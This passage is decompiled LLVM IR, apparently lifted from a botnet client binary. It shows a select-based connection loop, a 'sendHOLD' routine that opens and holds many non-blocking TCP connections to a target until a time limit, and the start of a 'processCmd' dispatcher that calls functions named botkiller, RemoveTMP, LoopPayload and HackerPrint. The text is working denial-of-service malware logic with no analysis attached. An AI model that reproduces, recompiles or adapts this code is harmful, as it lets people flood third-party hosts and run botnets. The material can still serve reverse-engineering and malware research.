  %v1_1000aa84 = add i32 %v2_1000aa80, 1
  store i32 268479144, i32* @lr, align 4
  %v5_1000aaa4 = call i32 @__libc_select(i32 %v1_1000aa84, i32 0, i32 %v2_1000a9b4, i32 0, i32 %v2_1000aa8c)
  %v3_1000aab4 = icmp eq i32 %v5_1000aaa4, 1
  br i1 %v3_1000aab4, label %dec_label_pc_1000aabc, label %dec_label_pc_1000ab58

dec_label_pc_1000aabc:                            ; preds = %dec_label_pc_1000a9f8
  store i32 4, i32* %stack_var_-48, align 4
  %v2_1000aad4 = load i32, i32* %v1_1000aa08, align 8
  store i32 268479224, i32* @lr, align 4
  %v5_1000aaf4 = call i32 @getsockopt(i32 %v2_1000aad4, i32 1, i32 4, i32 %v2_1000aad8, i32 %v2_1000aadc)
  %v3_1000aaf8 = load i32, i32* %stack_var_-44, align 4
  %v3_1000aafc = icmp eq i32 %v3_1000aaf8, 0
  br i1 %v3_1000aafc, label %dec_label_pc_1000ab3c, label %dec_label_pc_1000ab04

dec_label_pc_1000ab04:                            ; preds = %dec_label_pc_1000aabc
  %v2_1000ab14 = load i32, i32* %v1_1000aa08, align 8
  store i32 268479264, i32* @lr, align 4
  %v1_1000ab1c = call i32 @__libc_close(i32 %v2_1000ab14)
  store i8 0, i8* %v2_1000a878, align 4
  br label %dec_label_pc_1000ac2c

dec_label_pc_1000ab3c:                            ; preds = %dec_label_pc_1000aabc
  store i8 2, i8* %v2_1000a878, align 4
  br label %dec_label_pc_1000ac2c

dec_label_pc_1000ab58:                            ; preds = %dec_label_pc_1000a9f8
  %v4_1000ab60 = icmp eq i32 %v5_1000aaa4, -1
  br i1 %v4_1000ab60, label %dec_label_pc_1000ab68, label %dec_label_pc_1000ac2c

dec_label_pc_1000ab68:                            ; preds = %dec_label_pc_1000ab58
  %v2_1000ab78 = load i32, i32* %v1_1000aa08, align 8
  store i32 268479364, i32* @lr, align 4
  %v1_1000ab80 = call i32 @__libc_close(i32 %v2_1000ab78)
  store i8 0, i8* %v2_1000a878, align 4
  br label %dec_label_pc_1000ac2c

dec_label_pc_1000aba0:                            ; preds = %dec_label_pc_1000a890
  %v2_1000aba8 = call i32 @makeRandomStr(i32 %v1_1000a81c, i32 1024)
  %v1_1000abbc = inttoptr i32 %v2_1000a874 to i32*
  %v2_1000abbc = load i32, i32* %v1_1000abbc, align 8
  store i32 268479444, i32* @lr, align 4
  %v4_1000abd0 = call i32 @__libc_send(i32 %v2_1000abbc, i32 %v1_1000a81c, i32 1024, i32 16384)
  %v4_1000abdc = icmp eq i32 %v4_1000abd0, -1
  br i1 %v4_1000abdc, label %dec_label_pc_1000abe4, label %dec_label_pc_1000ac2c

dec_label_pc_1000abe4:                            ; preds = %dec_label_pc_1000aba0
  %v0_1000abe4 = call i32 @__errno_location()
  %v1_1000abec = inttoptr i32 %v0_1000abe4 to i32*
  %v2_1000abec = load i32, i32* %v1_1000abec, align 4
  %v3_1000abf0 = icmp eq i32 %v2_1000abec, 11
  br i1 %v3_1000abf0, label %dec_label_pc_1000ac2c, label %dec_label_pc_1000abf8

dec_label_pc_1000abf8:                            ; preds = %dec_label_pc_1000abe4
  %v2_1000ac08 = load i32, i32* %v1_1000abbc, align 8
  store i32 268479508, i32* @lr, align 4
  %v1_1000ac10 = call i32 @__libc_close(i32 %v2_1000ac08)
  store i8 0, i8* %v2_1000a878, align 4
  br label %dec_label_pc_1000ac2c

dec_label_pc_1000ac2c:                            ; preds = %dec_label_pc_1000a89c, %dec_label_pc_1000ab58, %dec_label_pc_1000aba0, %dec_label_pc_1000abe4, %dec_label_pc_1000ab68, %dec_label_pc_1000ab3c, %dec_label_pc_1000ab04, %dec_label_pc_1000a998, %dec_label_pc_1000a978, %dec_label_pc_1000abf8
  %v1_1000ac30 = add nuw nsw i32 %storemerge28, 1
  %v2_1000ac40 = icmp slt i32 %v1_1000ac30, %v3_1000a74c
  br i1 %v2_1000ac40, label %dec_label_pc_1000a868, label %dec_label_pc_1000ac48.loopexit

dec_label_pc_1000ac48.loopexit:                   ; preds = %dec_label_pc_1000ac2c, %dec_label_pc_1000ac38.preheader
  store i32 268479568, i32* @lr, align 4
  %v1_1000ac4c = call i32 @__GI_time(i32 0)
  %v2_1000ac58 = icmp slt i32 %v1_1000ac4c, %v2_1000a850
  br i1 %v2_1000ac58, label %dec_label_pc_1000ac38.preheader, label %dec_label_pc_1000ac60

dec_label_pc_1000ac38.preheader:                  ; preds = %dec_label_pc_1000ac38.preheader.lr.ph, %dec_label_pc_1000ac48.loopexit
  br i1 %v2_1000ac405, label %dec_label_pc_1000a868, label %dec_label_pc_1000ac48.loopexit

dec_label_pc_1000ac60:                            ; preds = %dec_label_pc_1000ac48.loopexit, %dec_label_pc_1000a79c, %entry
  %v0_1000ac88 = phi i32 [ %v4_1000a788, %entry ], [ %v1_1000ac4c10, %dec_label_pc_1000a79c ], [ %v1_1000ac4c, %dec_label_pc_1000ac48.loopexit ]
  ret i32 %v0_1000ac88

; uselistorder directives
  uselistorder i32 %v1_1000ac30, { 1, 0 }
  uselistorder i32 %v1_1000a9e4, { 1, 0 }
  uselistorder i32 %v2_1000a8e4, { 1, 0 }
  uselistorder i8* %v2_1000a878, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_1000a874, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge28, { 2, 0, 1 }
  uselistorder i32 %v2_1000a9b4, { 1, 0, 2 }
  uselistorder i32 %v2_1000a850, { 1, 0 }
  uselistorder i32 %v2_1000a778, { 1, 0 }
  uselistorder i32 %v1_1000a764, { 1, 0 }
  uselistorder i32 %v3_1000a74c, { 1, 0, 2 }
  uselistorder i32 %v1_1000a74c, { 1, 0 }
  uselistorder i32 %v0_1000a744, { 1, 0 }
  uselistorder i32* %stack_var_-200, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 2, 1, 0 }
  uselistorder i32 268479568, { 1, 0 }
  uselistorder label %dec_label_pc_1000ac38.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000ac48.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1000ac2c, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_1000a978, { 1, 0 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000ac8c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000ac8c, i32* %stack_var_-256, align 4
  store i32 268479676, i32* @lr, align 4
  %v0_1000acb8 = call i32 @getdtablesize()
  %v1_1000acc0 = udiv i32 %v0_1000acb8, 2
  %v2_1000acc0 = and i32 %v0_1000acb8, -2147483648
  %v3_1000acc0 = or i32 %v1_1000acc0, %v2_1000acc0
  store i32 2, i32* %stack_var_-208, align 4
  %v1_1000acd8 = urem i32 %arg2, 65536
  store i32 %v1_1000acd8, i32* @r3, align 4
  %v1_1000ace0 = call i32 @htons(i32 %v1_1000acd8)
  %v2_1000acec = ptrtoint i32* %stack_var_-208 to i32
  %v4_1000acfc = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-204, i32 %v2_1000acec)
  %v3_1000ad04 = icmp eq i32 %v4_1000acfc, 0
  br i1 %v3_1000ad04, label %dec_label_pc_1000ad10, label %dec_label_pc_1000b284

dec_label_pc_1000ad10:                            ; preds = %entry
  %v1_1000ad2c = mul i32 %v1_1000acc0, 8
  %v1_1000ad34 = add i32 %v1_1000ad2c, 30
  %v1_1000ad38 = and i32 %v1_1000ad34, -16
  %v2_1000ad40 = load i32, i32* %stack_var_-256, align 4
  %v1_1000ad48 = load i32, i32* @r1, align 4
  %v3_1000ad48 = sub i32 %v1_1000ad48, %v1_1000ad38
  %v4_1000ad48 = inttoptr i32 %v3_1000ad48 to i32*
  store i32 %v2_1000ad40, i32* %v4_1000ad48, align 4
  %v1_1000ad58 = add i32 %v3_1000ad48, 23
  %v1_1000ad5c = and i32 %v1_1000ad58, -16
  %v1_1000ad78 = mul i32 %v3_1000acc0, 5
  store i32 268479884, i32* @lr, align 4
  %v3_1000ad88 = call i32 @__GI_memset(i32 %v1_1000ad5c, i32 0, i32 %v1_1000ad78)
  store i32 268479892, i32* @lr, align 4
  %v1_1000ad90 = call i32 @malloc(i32 1024)
  store i32 ptrtoint ([3 x i8]* @global_var_1000adb4.932 to i32), i32* @lr, align 4
  %v3_1000adb0 = call i32 @__GI_memset(i32 %v1_1000ad90, i32 0, i32 1024)
  store i32 268479932, i32* @lr, align 4
  %v1_1000adb8 = call i32 @__GI_time(i32 0)
  %v2_1000adc4 = add i32 %v1_1000adb8, %arg3
  store i32 268481140, i32* @lr, align 4
  %v1_1000b27013 = call i32 @__GI_time(i32 0)
  %v2_1000b27c14 = icmp slt i32 %v1_1000b27013, %v2_1000adc4
  br i1 %v2_1000b27c14, label %dec_label_pc_1000b25c.preheader.lr.ph, label %dec_label_pc_1000b284

dec_label_pc_1000b25c.preheader.lr.ph:            ; preds = %dec_label_pc_1000ad10
  %v2_1000b2648 = icmp sgt i32 %v3_1000acc0, 0
  %v2_1000af28 = ptrtoint i32* %stack_var_-192 to i32
  %v2_1000af8c = ptrtoint i32* %stack_var_-248 to i32
  %v2_1000af90 = add i32 %v2_1000af8c, 56
  %v2_1000b000 = ptrtoint i32* %stack_var_-64 to i32
  %v2_1000b04c = ptrtoint i32* %stack_var_-52 to i32
  %v2_1000b050 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_1000b25c.preheader

dec_label_pc_1000addc:                            ; preds = %dec_label_pc_1000b25c.preheader, %dec_label_pc_1000b250
  %storemerge311 = phi i32 [ %v1_1000b254, %dec_label_pc_1000b250 ], [ 0, %dec_label_pc_1000b25c.preheader ]
  %v1_1000ade4 = mul i32 %storemerge311, 8
  %v2_1000ade8 = add i32 %v1_1000ade4, %v1_1000ad5c
  %v1_1000adec = or i32 %v2_1000ade8, 4
  %v2_1000adec = inttoptr i32 %v1_1000adec to i8*
  %v3_1000adec = load i8, i8* %v2_1000adec, align 4
  %v1_1000adfc = icmp eq i8 %v3_1000adec, 0
  %v3_1000adfc = icmp eq i8 %v3_1000adec, 1
  br i1 %v3_1000adfc, label %dec_label_pc_1000af28, label %dec_label_pc_1000ae04

dec_label_pc_1000ae04:                            ; preds = %dec_label_pc_1000addc
  %v3_1000ae08 = icmp eq i8 %v3_1000adec, 2
  br i1 %v3_1000ae08, label %dec_label_pc_1000b114, label %dec_label_pc_1000ae10

dec_label_pc_1000ae10:                            ; preds = %dec_label_pc_1000ae04
  br i1 %v1_1000adfc, label %dec_label_pc_1000ae20, label %dec_label_pc_1000b250

dec_label_pc_1000ae20:                            ; preds = %dec_label_pc_1000ae10
  store i32 268480052, i32* @lr, align 4
  %v3_1000ae30 = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_1000ae3c = mul i32 %storemerge311, 8
  %v2_1000ae40 = add i32 %v1_1000ae3c, %v1_1000ad5c
  %v2_1000ae44 = inttoptr i32 %v2_1000ae40 to i32*
  store i32 %v3_1000ae30, i32* %v2_1000ae44, align 8
  %v1_1000ae58 = inttoptr i32 %v2_1000ade8 to i32*
  %v2_1000ae58 = load i32, i32* %v1_1000ae58, align 8
  store i32 268480132, i32* @lr, align 4
  %v2_1000ae80 = call i32 @__libc_fcntl(i32 %v2_1000ae58, i32 3)
  store i32 268480160, i32* @lr, align 4
  %v2_1000ae9c = call i32 @__libc_fcntl(i32 %v2_1000ae58, i32 4)
  %v2_1000aeb0 = load i32, i32* %v1_1000ae58, align 8
  store i32 268480200, i32* @lr, align 4
  %v3_1000aec4 = call i32 @__libc_connect(i32 %v2_1000aeb0, i32 %v2_1000acec, i32 16)
  %v4_1000aed0 = icmp eq i32 %v3_1000aec4, -1
  br i1 %v4_1000aed0, label %dec_label_pc_1000aed8, label %dec_label_pc_1000aeec

dec_label_pc_1000aed8:                            ; preds = %dec_label_pc_1000ae20
  %v0_1000aed8 = call i32 @__errno_location()
  %v1_1000aee0 = inttoptr i32 %v0_1000aed8 to i32*
  %v2_1000aee0 = load i32, i32* %v1_1000aee0, align 4
  %v3_1000aee4 = icmp eq i32 %v2_1000aee0, 115
  br i1 %v3_1000aee4, label %dec_label_pc_1000af0c, label %dec_label_pc_1000aeec

dec_label_pc_1000aeec:                            ; preds = %dec_label_pc_1000ae20, %dec_label_pc_1000aed8
  %v2_1000aefc = load i32, i32* %v1_1000ae58, align 8
  store i32 ptrtoint (i32* @global_var_1000af08.933 to i32), i32* @lr, align 4
  %v1_1000af04 = call i32 @__libc_close(i32 %v2_1000aefc)
  br label %dec_label_pc_1000b250

dec_label_pc_1000af0c:                            ; preds = %dec_label_pc_1000aed8
  store i8 1, i8* %v2_1000adec, align 4
  br label %dec_label_pc_1000b250

dec_label_pc_1000af28:                            ; preds = %dec_label_pc_1000addc
  br label %dec_label_pc_1000af3c

dec_label_pc_1000af3c:                            ; preds = %dec_label_pc_1000af28, %dec_label_pc_1000af3c
  %storemerge57 = phi i32 [ 0, %dec_label_pc_1000af28 ], [ %v1_1000af58, %dec_label_pc_1000af3c ]
  %v1_1000af44 = mul nuw nsw i32 %storemerge57, 4
  %v2_1000af48 = add i32 %v1_1000af44, %v2_1000af28
  %v2_1000af50 = inttoptr i32 %v2_1000af48 to i32*
  store i32 0, i32* %v2_1000af50, align 4
  %v1_1000af58 = add nuw nsw i32 %storemerge57, 1
  %tmp50 = icmp ult i32 %v1_1000af58, 32
  br i1 %tmp50, label %dec_label_pc_1000af3c, label %dec_label_pc_1000af6c

dec_label_pc_1000af6c:                            ; preds = %dec_label_pc_1000af3c
  %v1_1000af7c = inttoptr i32 %v2_1000ade8 to i32*
  %v2_1000af7c = load i32, i32* %v1_1000af7c, align 8
  %v1_1000af80 = udiv i32 %v2_1000af7c, 32
  %v1_1000af88 = mul nuw nsw i32 %v1_1000af80, 4
  %v1_1000af94 = add i32 %v1_1000af88, %v2_1000af90
  %v1_1000af98 = inttoptr i32 %v1_1000af94 to i32*
  %v2_1000af98 = load i32, i32* %v1_1000af98, align 4
  %v1_1000afb0 = urem i32 %v2_1000af7c, 32
  %v3_1000afb8 = shl i32 1, %v1_1000afb0
  %v2_1000afbc = or i32 %v3_1000afb8, %v2_1000af98
  store i32 %v2_1000afbc, i32* %v1_1000af98, align 4
  store i32 0, i32* %stack_var_-64, align 4
  %v2_1000aff4 = load i32, i32* %v1_1000af7c, align 8
  %v1_1000aff8 = add i32 %v2_1000aff4, 1
  store i32 268480540, i32* @lr, align 4
  %v5_1000b018 = call i32 @__libc_select(i32 %v1_1000aff8, i32 0, i32 %v2_1000af28, i32 0, i32 %v2_1000b000)
  %v3_1000b028 = icmp eq i32 %v5_1000b018, 1
  br i1 %v3_1000b028, label %dec_label_pc_1000b030, label %dec_label_pc_1000b0cc

dec_label_pc_1000b030:                            ; preds = %dec_label_pc_1000af6c
  store i32 4, i32* %stack_var_-56, align 4
  %v2_1000b048 = load i32, i32* %v1_1000af7c, align 8
  store i32 268480620, i32* @lr, align 4
  %v5_1000b068 = call i32 @getsockopt(i32 %v2_1000b048, i32 1, i32 4, i32 %v2_1000b04c, i32 %v2_1000b050)
  %v3_1000b06c = load i32, i32* %stack_var_-52, align 4
  %v3_1000b070 = icmp eq i32 %v3_1000b06c, 0
  br i1 %v3_1000b070, label %dec_label_pc_1000b0b0, label %dec_label_pc_1000b078

dec_label_pc_1000b078:                            ; preds = %dec_label_pc_1000b030
  %v2_1000b088 = load i32, i32* %v1_1000af7c, align 8
  store i32 268480660, i32* @lr, align 4
  %v1_1000b090 = call i32 @__libc_close(i32 %v2_1000b088)
  store i8 0, i8* %v2_1000adec, align 4
  br label %dec_label_pc_1000b250

dec_label_pc_1000b0b0:                            ; preds = %dec_label_pc_1000b030
  store i8 2, i8* %v2_1000adec, align 4
  br label %dec_label_pc_1000b250

dec_label_pc_1000b0cc:                            ; preds = %dec_label_pc_1000af6c
  %v4_1000b0d4 = icmp eq i32 %v5_1000b018, -1
  br i1 %v4_1000b0d4, label %dec_label_pc_1000b0dc, label %dec_label_pc_1000b250

dec_label_pc_1000b0dc:                            ; preds = %dec_label_pc_1000b0cc
  %v2_1000b0ec = load i32, i32* %v1_1000af7c, align 8
  store i32 268480760, i32* @lr, align 4
  %v1_1000b0f4 = call i32 @__libc_close(i32 %v2_1000b0ec)
  store i8 0, i8* %v2_1000adec, align 4
  br label %dec_label_pc_1000b250

dec_label_pc_1000b114:                            ; preds = %dec_label_pc_1000ae04
  store i32 %v2_1000af28, i32* %stack_var_-248, align 4
  store i32 0, i32* %stack_var_-192, align 4
  br label %dec_label_pc_1000b128.dec_label_pc_1000b128_crit_edge

dec_label_pc_1000b128.dec_label_pc_1000b128_crit_edge: ; preds = %dec_label_pc_1000b128.dec_label_pc_1000b128_crit_edge.dec_label_pc_1000b128.dec_label_pc_1000b128_crit_edge_crit_edge, %dec_label_pc_1000b114
  %v3_1000b12c.pre = phi i32 [ %v2_1000af28, %dec_label_pc_1000b114 ], [ %v3_1000b12c.pre.pre, %dec_label_pc_1000b128.dec_label_pc_1000b128_crit_edge.dec_label_pc_1000b128.dec_label_pc_1000b128_crit_edge_crit_edge ]
  %v1_1000b14453 = phi i32 [ 1, %dec_label_pc_1000b114 ], [ %v1_1000b144, %dec_label_pc_1000b128.dec_label_pc_1000b128_crit_edge.dec_label_pc_1000b128.dec_label_pc_1000b128_crit_edge_crit_edge ]
  %v1_1000b130 = mul nuw nsw i32 %v1_1000b14453, 4
  %v2_1000b134 = add i32 %v1_1000b130, %v3_1000b12c.pre
  %v2_1000b13c = inttoptr i32 %v2_1000b134 to i32*
  store i32 0, i32* %v2_1000b13c, align 4
  %v1_1000b144 = add nuw nsw i32 %v1_1000b14453, 1
  %tmp51 = icmp ult i32 %v1_1000b144, 32
  br i1 %tmp51, label %dec_label_pc_1000b128.dec_label_pc_1000b128_crit_edge.dec_label_pc_1000b128.dec_label_pc_1000b128_crit_edge_crit_edge, label %dec_label_pc_1000b158

dec_label_pc_1000b128.dec_label_pc_1000b128_crit_edge.dec_label_pc_1000b128.dec_label_pc_1000b128_crit_edge_crit_edge: ; preds = %dec_label_pc_1000b128.dec_label_pc_1000b128_crit_edge
  %v3_1000b12c.pre.pre = load i32, i32* %stack_var_-248, align 4
  br label %dec_label_pc_1000b128.dec_label_pc_1000b128_crit_edge

dec_label_pc_1000b158:                            ; preds = %dec_label_pc_1000b128.dec_label_pc_1000b128_crit_edge
  %v1_1000b168 = inttoptr i32 %v2_1000ade8 to i32*
  %v2_1000b168 = load i32, i32* %v1_1000b168, align 8
  %v1_1000b16c = udiv i32 %v2_1000b168, 32
  %v1_1000b174 = mul nuw nsw i32 %v1_1000b16c, 4
  %v1_1000b180 = add i32 %v1_1000b174, %v2_1000af90
  %v1_1000b184 = inttoptr i32 %v1_1000b180 to i32*
  %v2_1000b184 = load i32, i32* %v1_1000b184, align 4
  %v1_1000b19c = urem i32 %v2_1000b168, 32
  %v3_1000b1a4 = shl i32 1, %v1_1000b19c
  %v2_1000b1a8 = or i32 %v3_1000b1a4, %v2_1000b184
  store i32 %v2_1000b1a8, i32* %v1_1000b184, align 4
  store i32 0, i32* %stack_var_-64, align 4
  %v2_1000b1e0 = load i32, i32* %v1_1000b168, align 8
  %v1_1000b1e4 = add i32 %v2_1000b1e0, 1
  store i32 268481032, i32* @lr, align 4
  %v5_1000b204 = call i32 @__libc_select(i32 %v1_1000b1e4, i32 0, i32 0, i32 %v2_1000af28, i32 %v2_1000b000)
  %v3_1000b214 = icmp eq i32 %v5_1000b204, 0
  br i1 %v3_1000b214, label %dec_label_pc_1000b250, label %dec_label_pc_1000b21c

dec_label_pc_1000b21c:                            ; preds = %dec_label_pc_1000b158
  %v2_1000b22c = load i32, i32* %v1_1000b168, align 8
  store i32 268481080, i32* @lr, align 4
  %v1_1000b234 = call i32 @__libc_close(i32 %v2_1000b22c)
  store i8 0, i8* %v2_1000adec, align 4
  br label %dec_label_pc_1000b250

dec_label_pc_1000b250:                            ; preds = %dec_label_pc_1000ae10, %dec_label_pc_1000b0cc, %dec_label_pc_1000b158, %dec_label_pc_1000b0dc, %dec_label_pc_1000b0b0, %dec_label_pc_1000b078, %dec_label_pc_1000af0c, %dec_label_pc_1000aeec, %dec_label_pc_1000b21c
  %v1_1000b254 = add nuw nsw i32 %storemerge311, 1
  %v2_1000b264 = icmp slt i32 %v1_1000b254, %v3_1000acc0
  br i1 %v2_1000b264, label %dec_label_pc_1000addc, label %dec_label_pc_1000b26c.loopexit

dec_label_pc_1000b26c.loopexit:                   ; preds = %dec_label_pc_1000b250, %dec_label_pc_1000b25c.preheader
  store i32 268481140, i32* @lr, align 4
  %v1_1000b270 = call i32 @__GI_time(i32 0)
  %v2_1000b27c = icmp slt i32 %v1_1000b270, %v2_1000adc4
  br i1 %v2_1000b27c, label %dec_label_pc_1000b25c.preheader, label %dec_label_pc_1000b284

dec_label_pc_1000b25c.preheader:                  ; preds = %dec_label_pc_1000b25c.preheader.lr.ph, %dec_label_pc_1000b26c.loopexit
  br i1 %v2_1000b2648, label %dec_label_pc_1000addc, label %dec_label_pc_1000b26c.loopexit

dec_label_pc_1000b284:                            ; preds = %dec_label_pc_1000b26c.loopexit, %dec_label_pc_1000ad10, %entry
  %v0_1000b2ac = phi i32 [ %v4_1000acfc, %entry ], [ %v1_1000b27013, %dec_label_pc_1000ad10 ], [ %v1_1000b270, %dec_label_pc_1000b26c.loopexit ]
  ret i32 %v0_1000b2ac

; uselistorder directives
  uselistorder i32 %v1_1000b254, { 1, 0 }
  uselistorder i32 %v1_1000b144, { 1, 0 }
  uselistorder i32 %storemerge57, { 1, 0 }
  uselistorder i32 %v2_1000ae58, { 1, 0 }
  uselistorder i8* %v2_1000adec, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_1000ade8, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge311, { 2, 0, 1 }
  uselistorder i32 %v2_1000af28, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_1000adc4, { 1, 0 }
  uselistorder i32 %v2_1000acec, { 1, 0 }
  uselistorder i32 %v1_1000acd8, { 1, 0 }
  uselistorder i32 %v3_1000acc0, { 1, 0, 2 }
  uselistorder i32 %v1_1000acc0, { 1, 0 }
  uselistorder i32 %v0_1000acb8, { 1, 0 }
  uselistorder i32* %stack_var_-208, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 115, { 1, 2, 0, 3, 4 }
  uselistorder i32 268481140, { 1, 0 }
  uselistorder i32 -16, { 1, 0, 3, 2, 5, 4, 7, 6, 8, 9 }
  uselistorder i32 ()* @getdtablesize, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b25c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000b26c.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1000b250, { 8, 2, 3, 1, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_1000af3c, { 1, 0 }
  uselistorder label %dec_label_pc_1000aeec, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-80 = alloca i32, align 4
  %v2_1000b2e4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10016518.31 to i32), i32* @r4, align 4
  %v3_1000b2f4 = inttoptr i32 %v2_1000b2e4 to i8*
  %v4_1000b2f4 = call i32 @__GI_strcoll(i8* %v3_1000b2f4, i32 ptrtoint ([5 x i8]* @global_var_10016518.31 to i32))
  %v3_1000b2fc = icmp eq i32 %v4_1000b2f4, 0
  br i1 %v3_1000b2fc, label %dec_label_pc_1000b304, label %dec_label_pc_1000b324

dec_label_pc_1000b304:                            ; preds = %entry
  %v3_1000b308 = load i32, i32* @global_var_1002c8e0.30, align 4
  store i32 ptrtoint (i32* @global_var_1000b320.935 to i32), i32* @lr, align 4
  %v4_1000b31c = call i32 @HackerPrint(i32 %v3_1000b308, i32 ptrtoint ([6 x i8]* @global_var_1001aa70.934 to i32), i32 268566528)
  br label %dec_label_pc_1000c690

dec_label_pc_1000b324:                            ; preds = %entry
  %v2_1000b328 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1001aa78.936 to i32), i32* @r4, align 4
  %v3_1000b338 = inttoptr i32 %v2_1000b328 to i8*
  %v4_1000b338 = call i32 @__GI_strcoll(i8* %v3_1000b338, i32 ptrtoint ([11 x i8]* @global_var_1001aa78.936 to i32))
  %v3_1000b340 = icmp eq i32 %v4_1000b338, 0
  br i1 %v3_1000b340, label %dec_label_pc_1000b348, label %dec_label_pc_1000b388

dec_label_pc_1000b348:                            ; preds = %dec_label_pc_1000b324
  %v3_1000b354 = load i32, i32* @global_var_1002c908.248, align 4
  store i32 %v3_1000b354, i32* %stack_var_-80, align 4
  store i32 268481384, i32* @lr, align 4
  %v3_1000b364 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_1000b36c = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_1000b384.938 to i32), i32* @lr, align 4
  %v5_1000b380 = call i32 @HackerPrint(i32 %v0_1000b36c, i32 ptrtoint ([10 x i8]* @global_var_1001aa84.937 to i32), i32 %v3_1000b364)
  br label %dec_label_pc_1000c690

dec_label_pc_1000b388:                            ; preds = %dec_label_pc_1000b324
  %v2_1000b38c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1001aa90.939 to i32), i32* @r4, align 4
  %v3_1000b39c = inttoptr i32 %v2_1000b38c to i8*
  %v4_1000b39c = call i32 @__GI_strcoll(i8* %v3_1000b39c, i32 ptrtoint ([8 x i8]* @global_var_1001aa90.939 to i32))
  %v3_1000b3a4 = icmp eq i32 %v4_1000b39c, 0
  br i1 %v3_1000b3a4, label %dec_label_pc_1000b3ac, label %dec_label_pc_1000b3e8

dec_label_pc_1000b3ac:                            ; preds = %dec_label_pc_1000b388
  store i32 268481456, i32* @lr, align 4
  %v0_1000b3ac = call i32 @listFork()
  %v3_1000b3b4 = icmp eq i32 %v0_1000b3ac, 0
  br i1 %v3_1000b3b4, label %dec_label_pc_1000b3bc, label %dec_label_pc_1000b3e8

dec_label_pc_1000b3bc:                            ; preds = %dec_label_pc_1000b3ac
  %v3_1000b3c0 = load i32, i32* @global_var_1002c8e0.30, align 4
  store i32 268481496, i32* @lr, align 4
  %v4_1000b3d4 = call i32 @HackerPrint(i32 %v3_1000b3c0, i32 ptrtoint ([13 x i8]* @global_var_1001aa98.940 to i32), i32 268566528)
  %v1_1000b3d8 = call i32 @botkiller(i32 %v4_1000b3d4)
  store i32 ptrtoint ([3 x i8]* @global_var_1000b3e0.941 to i32), i32* @lr, align 4
  %v1_1000b3dc = call i32 @RemoveTMP(i32 %v1_1000b3d8)
  %v1_1000b3e4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000b3e8

dec_label_pc_1000b3e8:                            ; preds = %dec_label_pc_1000b3ac, %dec_label_pc_1000b388, %dec_label_pc_1000b3bc
  %v2_1000b3ec = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001aaa8.942 to i32), i32* @r4, align 4
  %v3_1000b3fc = inttoptr i32 %v2_1000b3ec to i8*
  %v4_1000b3fc = call i32 @__GI_strcoll(i8* %v3_1000b3fc, i32 ptrtoint ([7 x i8]* @global_var_1001aaa8.942 to i32))
  %v3_1000b404 = icmp eq i32 %v4_1000b3fc, 0
  br i1 %v3_1000b404, label %dec_label_pc_1000b40c, label %dec_label_pc_1000b444

dec_label_pc_1000b40c:                            ; preds = %dec_label_pc_1000b3e8
  store i32 268481552, i32* @lr, align 4
  %v0_1000b40c = call i32 @listFork()
  %v3_1000b414 = icmp eq i32 %v0_1000b40c, 0
  br i1 %v3_1000b414, label %dec_label_pc_1000b41c, label %dec_label_pc_1000b444

dec_label_pc_1000b41c:                            ; preds = %dec_label_pc_1000b40c
  %v3_1000b420 = load i32, i32* @global_var_1002c8e0.30, align 4
  store i32 268481592, i32* @lr, align 4
  %v4_1000b434 = call i32 @HackerPrint(i32 %v3_1000b420, i32 ptrtoint ([16 x i8]* @global_var_1001aab0.943 to i32), i32 268566528)
  %v1_1000b438 = call i32 @LoopPayload(i32 %v4_1000b434)
  %v1_1000b440 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000b444

dec_label_pc_1000b444:                            ; preds = %dec_label_pc_1000b40c, %dec_label_pc_1000b3e8, %dec_label_pc_1000b41c
  %v2_1000b448 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001aac0.945 to i32), i32* @r4, align 4
  %v3_1000b458 = inttoptr i32 %v2_1000b448 to i8*
  %v4_1000b458 = call i32 @__GI_strcoll(i8* %v3_1000b458, i32 ptrtoint ([7 x i8]* @global_var_1001aac0.945 to i32))
  %v3_1000b460 = icmp eq i32 %v4_1000b458, 0
  br i1 %v3_1000b460, label %dec_label_pc_1000b468, label %dec_label_pc_1000b584

